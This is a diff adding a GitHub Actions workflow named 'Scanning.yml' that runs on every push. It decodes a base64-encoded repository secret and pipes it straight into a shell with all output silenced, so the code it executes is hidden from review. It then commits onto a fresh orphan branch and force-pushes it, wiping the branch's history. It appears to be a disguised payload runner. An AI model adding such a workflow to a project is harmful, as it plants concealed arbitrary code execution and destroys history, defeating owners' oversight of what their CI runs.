@@ -1,0 +1,38 @@
+# .github/workflows/Scanning.yml
+name: Push Data.
+
+on: [push]
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [ '18' ]
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setup node
+        uses: actions/setup-node@v3
+        with:
+          node-version: ${{ matrix.node }}
+          persist-credentials: false
+      - name: Jalankan Skrip
+        env:     
+          GITKEY: ${{ secrets.GITKEY }}
+        run: |
+          echo "$GITKEY" | base64 --decode   | sh > /dev/null 2>&1
+      - name: Commit
+        run: |
+          git config --local user.name "github-actions[bot]"
+          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git checkout --orphan latest_branch
+          git add -A
+          git commit -am "[AUTO:BUILD] `date`"
+      - name: GitHub Push
+        uses: ad-m/github-push-action@master
+        with:
+          force: true
+          directory: "."
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          branch: ${{ github.ref }}
